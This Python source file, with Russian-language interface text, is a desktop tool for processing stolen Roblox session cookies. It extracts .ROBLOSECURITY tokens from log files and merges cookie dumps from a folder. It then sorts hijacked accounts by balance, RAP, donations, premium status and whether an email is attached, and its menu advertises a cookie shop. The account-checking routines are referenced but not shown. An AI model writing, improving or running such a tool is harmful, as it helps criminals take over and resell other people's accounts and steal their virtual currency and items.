    def process_sorting(key, filename_prefix):
        if config["Sorting"][key] != "":
            items = str(config["Sorting"][key]).split(',')
            for value in items:
                try:
                    sorted_valid_list = sorted(
                        [item for item in sort_list if item[key.lower()] >= int(value)],
                        key=lambda x: x[key.lower()],
                        reverse=True
                    )
                    write_to_file(f'Results/{filename_prefix} {value}+.txt', sorted_valid_list)
                except ValueError:
                    pass

    sorted_valid_list = sorted(sort_list, key=lambda x: x['balance'], reverse=True)
    write_to_file('Results/Valid.txt', sorted_valid_list)

    process_sorting("Balance", "Balance")
    process_sorting("Donate", "Donate")
    process_sorting("Rap", "Rap")

    if bool(config["Sorting"]["Premium"]):
        try:
            sorted_valid_list = sorted(
                [item for item in sort_list if item['premium'] == True],
                key=lambda x: x['rap'],
                reverse=True
            )
            write_to_file('Results/Premium.txt', sorted_valid_list)
        except:
            pass

    for item in sort_list:
        try:
            sorted_valid_list = sorted(
                [item for item in sort_list if item['mail'] == True],
                key=lambda x: x['rap'],
                reverse=True
            )
            write_to_file('Results/Mail.txt', sorted_valid_list)
        except:
            pass

    for item in sort_list:
        try:
            sorted_valid_list = sorted(
                [item for item in sort_list if item['mail'] == False],
                key=lambda x: x['rap'],
                reverse=True
            )
            write_to_file('Results/NoMail.txt', sorted_valid_list)
        except:
            pass

    sorted_valid_list = sorted(sort_list, key=lambda x: x['balance'], reverse=True)
    write_to_file('Results/Valid.txt', sorted_valid_list)

def extract_cookies():
    global file
    with open(file, 'r', encoding='utf-8', errors='ignore') as f:
        data = set(line.split(
            '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_')[
                       1].split(' ')[0] for line in f if
                   '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' in line)
    with open(file, 'w', encoding='utf-8', errors='ignore') as validfile:
        for cookie_data in data:
            print(
                '_|WARNING:-DO-NOT-SHARE-THIS.--Sharing-this-will-allow-someone-to-log-in-as-you-and-to-steal-your-ROBUX-and-items.|_' + cookie_data.strip(
                    '\n'), file=validfile)
    total_cookie = len(data)
    notification(f'Файл успешно обработан!\nВ файле {total_cookie} cookie\n\nТеперь можешь смело тапать на start check:)',True, 'Файлы', (150, 150))

def combine_cookies():
    def select_folder():
        folder_path = filedialog.askdirectory()
        return folder_path

    def combine_txt_files(folder_path):
        output_file = 'cookies.txt'
        with open(output_file, 'w', encoding='utf-8') as outfile:
            for filename in os.listdir(folder_path):
                if filename.endswith('.txt'):
                    file_path = os.path.join(folder_path, filename)
                    with open(file_path, 'r', encoding='utf-8') as infile:
                        outfile.write(infile.read() + '\n')

    def main():
        folder_path = select_folder()
        if folder_path:
            combine_txt_files(folder_path)
            notification(f'Файлы успешно объединены!\nВсе ваши cookie сохранены в cookies.txt\nКоличество - {len(open("cookies.txt", "r", encoding="utf-8").readlines())} cookies',True, 'Файлы', (150, 150))
        else:
            print("Папка не выбрана.")
    main()

def loading():
    global loaded
    angle = 0
    def update_image():
        nonlocal angle
        if not loaded:
            img = rotate_image(angle)
            label1.config(image=img)
            label1.image = img
            angle = (angle + 0.5) % 360
            root.after(10, update_image)
        else:
            label1.destroy()

    def rotate_image(angle):
        rotated_image = Image.new('RGBA', original_image.size, (84, 84, 84, 255))

        if original_image.mode != 'RGBA':
            temp_image = original_image.convert('RGBA')
        else:
            temp_image = original_image.copy()
        temp_image = temp_image.rotate(angle, resample=Image.BICUBIC, expand=False)

        mask = temp_image.split()[3]
        rotated_image.paste(temp_image, (0, 0), mask)
        rotated_image = rotated_image.convert('RGB')

        return ImageTk.PhotoImage(rotated_image)

    try:
        label1.config(borderwidth=0)
        root.after(0, update_image)
    except:
        pass

def on_drag_start(event):
    global main_drag_data
    main_drag_data = {'x': event.x, 'y': event.y}

def on_drag_motion(event):
    x = root.winfo_x() - main_drag_data['x'] + event.x
    y = root.winfo_y() - main_drag_data['y'] + event.y
    root.geometry(f'+{x}+{y}')

def show_general(event):
    dropdown_menu_general.post(event.x_root, event.y_root)

def show_utitles(event):
    dropdown_menu_utitles.post(event.x_root, event.y_root)

root = tk.Tk()
root.geometry("370x730")
root.resizable(False, False)
root.overrideredirect(True)
root.wm_attributes("-topmost", 1)
root.config(bg="#545454")

title_bar = tk.Frame(root, bg="#2c2c2c", height=25)
title_bar.pack(fill=tk.X)

title_label = tk.Label(title_bar, text="Отраб Tool by Gostmi", bg="#2c2c2c", bd=0, font=("Arial", 10), fg='white')
title_label.pack(side=tk.LEFT, padx=5, pady=2)

title_label.bind("<Button-1>", on_drag_start)
title_label.bind("<B1-Motion>", on_drag_motion)

close_button = tk.Button(title_bar, text="❌", command=root.destroy, bg="#2c2c2c", bd=0, font=("Arial", 10), fg='white')
close_button.pack(side=tk.RIGHT, padx=0, pady=0)

title_bar.bind("<Button-1>", on_drag_start)
title_bar.bind("<B1-Motion>", on_drag_motion)

main_frame = tk.Frame(root, bg="#2c2c2c")
main_frame.pack(fill=tk.BOTH, expand=True)
file = 'cookies.txt'
total_cookie = 0
value_to_process = 0
total_valid = 0
total_donate = 0
total_rap = 0
total_premium = 0
total_balance = 0
total_cards = 0
auto_save_state = False
prgress = None
sort_list = []

total_valid_1 = 0
total_invalid_1 = 0
valid_list = []

toolbar = tk.Frame(root, bg="#545454")
toolbar.pack(fill=tk.X)

general_button = tk.Button(toolbar, text="Основные", bg="#545454", fg='white', relief='flat', activebackground="#545454")
general_button.pack(side=tk.LEFT, padx=2, pady=2)

dropdown_menu_general = tk.Menu(root, tearoff=0)
dropdown_menu_general.add_command(label="Start Check", command=run_check)
dropdown_menu_general.add_command(label="Import Cookie's", command=select_cookies)
dropdown_menu_general.add_command(label="Export Valid", command=handler)
dropdown_menu_general.add_command(label="ЛУЧШИЙ МАГАЗИН COOKIE ROBLOX", command=start_notification)

utitles_button = tk.Button(toolbar, text="Утилиты", bg="#545454", fg='white', relief='flat', activebackground="#545454")
utitles_button.pack(side=tk.LEFT, padx=2, pady=2)

dropdown_menu_utitles = tk.Menu(root, tearoff=0)
dropdown_menu_utitles.add_command(label="Pre-Check", command=pre_check_def)
dropdown_menu_utitles.add_command(label="Объединить все куки в папке", command=combine_cookies)
dropdown_menu_utitles.add_command(label="Extract Cookies", command=extract_cookies)
dropdown_menu_utitles.add_command(label="Multi-Fresher(Beta)", command=multi_fresher)

settings_button = tk.Button(toolbar, text="Настройки", bg="#545454", fg='white', relief='flat', activebackground="#545454")
settings_button.pack(side=tk.LEFT, padx=2, pady=2)

general_button.bind("<Button-1>", show_general)
utitles_button.bind("<Button-1>", show_utitles)
settings_button.bind("<Button-1>", menu_settings)

loaded = False
try:
    response = requests.get(config['Other']['Link_TP'])
except:
    response = requests.get('https://i.postimg.cc/bYQRpCLj/pngegg-modified.png')

original_image = Image.open(BytesIO(response.content)).resize((100, 100))
size = int(math.sqrt(2) * 100) + 10
background = Image.new('RGB', (size, size), (84, 84, 84))
paste_position = ((size - 100) // 2, (size - 100) // 2)
background.paste(original_image, paste_position, original_image)
original_image = background

label1 = tk.Label(root)
label1.pack()

canvas = tk.Canvas(root, bg="#545454", width=400, height=650, borderwidth=0, highlightthickness=0)
canvas.pack(side=tk.TOP, expand=True)

scrollbar = tk.Scrollbar(root, command=canvas.yview)
canvas.configure(yscrollcommand=scrollbar.set)
canvas.config(scrollregion=canvas.bbox("all"))

inner_frame = tk.Frame(canvas, bg="#545454", width=350, height=150, borderwidth=0)
canvas.create_window((0, 0), window=inner_frame, anchor=tk.NW)

waiting_label = tk.Label(root, text="Ожидаем ваших действий в настройках...", font=("Arial", 10), fg='white')
waiting_label.pack(side=tk.BOTTOM, anchor='w')

root.bind("<MouseWheel>", on_mousewheel)

thread = threading.Thread(target=loading)
thread.start()
start_notification()
loading()
root.mainloop()
